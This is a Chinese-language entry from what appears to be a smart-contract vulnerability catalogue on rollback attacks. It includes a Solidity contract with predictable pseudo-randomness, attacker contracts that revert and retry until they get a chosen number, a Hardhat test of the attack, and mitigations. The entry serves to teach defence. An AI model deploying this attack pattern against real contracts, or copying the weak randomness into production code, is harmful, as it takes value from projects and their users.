[后退](../../README_CN.md)
# 回滚攻击

**漏洞名称：** 回滚攻击 (Rollback Attack)

**风险等级：** 高 

**漏洞描述：**

顾名思义，就是利用回滚（重置）交易的方式来选择只对自己有利的条件。通常见于使用伪随机数的场景中，比如花费某种资产生成一个NFT，此时有一个属性随机，如果得到的不是想要的属性，通过重置交易的方式来取消这笔交易。也不需要花费相应的资产，仅需要支付交易失败的手续费。通过多次交易/验证/取消的方式直到得到自己想要的结果为止。



**示例代码语言：** Solidity

**漏洞示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract RollBackDemo {

    uint public seed = block.timestamp;

    mapping(address => uint) public lucky;

    function getLuckyNumber(uint salt) external payable {
        require(msg.value == 1 ether, "not one ether");
        uint rand = getRand(salt);
        lucky[msg.sender] = rand;
    }

    // return a random number in range [1,10]
    // This is just an example and should never be used in real scenarios
    function getRand(uint salt) internal returns (uint) {
        uint n = uint(keccak256(abi.encodePacked(seed * 2 + 1,"my_rand",salt)));
        uint rand = n % 10 + 1;
        seed = rand * seed + 20;
        return rand;
    }
}

contract RollBackAttackDemo {
    function gogo(address target, uint salt) external payable {
        require(msg.value == 1 ether, "not one ether");
        RollBackDemo(target).getLuckyNumber{value:msg.value}(salt);
        uint number = RollBackDemo(target).lucky(address(this));
        if(number != 6) {
            revert("not lucky number");
        }
    }
}

contract RollBackAttackSource {
    uint public counter;
    bool public successful;
    function go(address attack, address target) external payable {
        require(msg.value == 10 ether, "not ten ether");
        for(uint i=0;i<10;i++) {
            counter ++;
            try RollBackAttackDemo(attack).gogo{value: 1 ether}(target,i+1){
                successful = true;
                payable(msg.sender).transfer(address(this).balance);
                return; //success
            }catch (bytes memory) {
                // retry
            }
        }
    }
}
```



**示例代码简介：**

注意：本代码只是模拟回滚攻击，在真实场景中不会存在这样的代码，也不能将此示例代码应用到真实场景中。

攻击者调用`RollBackAttackSource`合约的`go`函数，它会调用`RollBackAttackDemo`的`gogo`函数，接着会调用`RollBackDemo`合约的`getLuckyNumber`函数来获取一个幸运数字。当这个幸运数字为6时，我们便认为获取了想要的数字。当幸运数字不为6时，我们便重置交易。通过一个`for`循环尝试10次，如果成功后直接返回，如果重置后捕获该重置，然后继续。需要注意的是，由于重置后合约`RollBackDemo`的所有状态全部重置，所以重新计算时会得到相同的值。因此我们手动引入了一个变化的`salt`变量来避免这种情况出现。



**单元测试代码：**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RollBackDemo Test", function () {
    let demo;
    let attack;
    let instance;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let RollBackAttackSource = await ethers.getContractFactory("RollBackAttackSource");
        instance = await RollBackAttackSource.deploy();
        let RollBackAttackDemo = await ethers.getContractFactory("RollBackAttackDemo");
        attack = await RollBackAttackDemo.deploy();
        let RollBackDemo = await ethers.getContractFactory("RollBackDemo");
        demo = await RollBackDemo.deploy();
        [owner,user1,user2,...users] = await ethers.getSigners();
    });
    
    describe('RollBack attack demo', () => { 
        it("Try ten times to get lucky number!", async () => {
            await instance.go(attack.address,demo.address,{
                value:ethers.utils.parseEther("10")
            });
            let flag = await instance.successful();
            if(flag) {
                let counter =  + (await instance.counter()).toString();
                expect(await demo.lucky(attack.address)).to.be.equal(6);
                expect(await ethers.provider.getBalance(demo.address))
                    .to.be.equal(ethers.utils.parseEther("1.0"));
                console.log("Cogratulations! Amounts of retries:",counter)
            }else {
                expect(await ethers.provider.getBalance(demo.address))
                    .to.be.equal(0);
                console.log("Failed!, Try again!");
            }
        });
    });
});
```



通过上述的测试代码可以看到，我们只会花一次的钱，确保我们得到想要的数字6。



**真实案例：**

暂未补充。



**相关建议：**

1. 必要时使用`require(tx.origin == msg.sender)`来限定相关接口只能由外部账号而非合约调用。

2. 不使用随机属性，这样会减少回滚攻击的风险。

   



